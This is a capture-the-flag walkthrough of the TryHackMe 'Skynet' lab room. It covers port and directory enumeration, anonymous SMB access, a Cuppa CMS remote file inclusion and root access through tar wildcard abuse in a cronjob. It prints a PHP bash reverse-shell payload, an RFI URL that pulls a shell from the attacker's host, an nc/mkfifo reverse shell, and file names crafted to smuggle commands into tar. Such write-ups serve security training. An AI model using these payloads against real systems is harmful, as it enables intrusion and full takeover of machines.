 TryHackMe - Skynet | Intermediate CTF Walkthrough

Platform: TryHackMe
Room: Skynet
Focus: Enumeration, SMB, POP3, IMAP, RFI Exploitation, Privilege Escalation via TAR Wildcards
🚀 TL;DR

    Port scanning via nmap

    Directory brute-force using gobuster

    SMB enumeration & credential harvesting

    Exploitation of Cuppa CMS (RFI)

    Privilege escalation via cronjob + tar wildcard injection

🔍 Enumeration Phase

Initial enumeration starts with a full TCP port scan:

nmap -sV -A -T4 <MACHINE_IP>

Open Ports Identified:

    80 (HTTP) → Web Interface

    139, 445 (SMB)

    110 (POP3)

    143 (IMAP)

The web interface displays a generic Skynet branding page — not much functionality. Time to fuzz directories:

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40

📁 SMB Enumeration

Using smbclient and smbmap, we discover an anonymous share:

smbclient //IP/anonymous

Inside, a log1.txt file reveals possible user credentials and references to another share: milesdyson.
✉️ Mail Service Enumeration

We notice open POP3 and IMAP ports. Combining the earlier credentials, we access SquirrelMail, where emails hint at:

    CMS in use

    Samba password reset

    Potential exploit paths

💥 Web Exploitation: Cuppa CMS RFI

Revisiting the site and exploring hidden directories leads us to /45kra24zxs28v3yd/administrator — revealing a Cuppa CMS instance.

The source code discloses a vulnerable inclusion point:

<?php include($_REQUEST["urlConfig"]); ?>

Using a Remote File Inclusion (RFI) attack, we gain initial shell access via a reverse shell payload:

php -S 0.0.0.0:8000
nc -lvnp 1234

Payload:

<?php system("bash -c 'bash -i >& /dev/tcp/<tun0_ip>/1234 0>&1'"); ?>

Trigger via:

http://<ip>/vuln.php?urlConfig=http://<tun0_ip>:8000/shell.php

🧑‍💻 Privilege Escalation: TAR Wildcard Abuse

After shell access, local enumeration reveals a suspicious cronjob:

/home/milesdyson/backups/backup.sh

It uses the tar command to back up web files — but no input sanitization!

We abuse tar wildcard expansion to gain root:

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tun0_ip> 4444 >/tmp/f' > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

nc -lvnp 4444

Within a minute — 🔥 ROOT ACCESS OBTAINED.
🏁 Flags Captured

    user.txt ✅

    root.txt ✅

